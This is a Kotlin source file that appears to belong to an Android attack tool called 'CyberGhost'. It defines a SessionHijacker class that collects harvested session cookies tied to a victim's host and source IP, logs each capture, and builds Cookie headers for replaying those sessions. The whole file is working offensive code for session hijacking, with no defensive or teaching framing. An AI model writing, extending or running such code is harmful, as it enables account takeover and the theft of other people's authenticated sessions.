package com.cyberghost.core

import android.content.Context
import android.util.Log
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import java.time.Instant

data class HijackSession(
    val id: String = java.util.UUID.randomUUID().toString(),
    val host: String,
    val cookies: String,
    val sourceIp: String,
    val capturedAt: Instant = Instant.now(),
    var label: String = ""
)

class SessionHijacker {
    private val _sessions = MutableStateFlow<List<HijackSession>>(emptyList())
    val sessions: StateFlow<List<HijackSession>> = _sessions
    private val store = mutableListOf<HijackSession>()

    fun addFromCredential(cred: HarvestedCredential) {
        if (cred.type != CredentialType.COOKIE_SESSION) return
        val cookieStr = cred.rawFields.entries.joinToString("; ") { "${it.key}=${it.value}" }
        if (cookieStr.isBlank()) return
        val session = HijackSession(
            host = cred.host,
            cookies = cookieStr,
            sourceIp = cred.sourceIp,
            label = cred.host
        )
        store.add(session)
        _sessions.value = store.toList()
        Log.i("CG2", "Hijack session added: ${cred.host}")
    }

    fun addManual(host: String, cookies: String, sourceIp: String) {
        val session = HijackSession(host = host, cookies = cookies, sourceIp = sourceIp, label = host)
        store.add(session)
        _sessions.value = store.toList()
    }

    fun remove(id: String) {
        store.removeAll { it.id == id }
        _sessions.value = store.toList()
    }

    fun clear() { store.clear(); _sessions.value = emptyList() }

    fun buildCookieHeader(session: HijackSession): Map<String, String> {
        return mapOf("Cookie" to session.cookies)
    }
}
